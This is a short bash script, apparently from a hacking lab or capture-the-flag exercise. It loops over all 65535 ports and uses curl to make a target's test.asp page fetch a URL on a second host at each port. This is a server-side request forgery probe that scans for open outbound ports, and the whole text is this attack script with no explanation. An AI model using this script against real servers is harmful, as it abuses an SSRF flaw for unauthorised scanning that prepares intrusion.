for i in $(seq 1 65535)
do
	curl http://10.10.10.57:62696/test.asp?u=http://10.10.14.16:$i > /dev/null
	echo $i
done
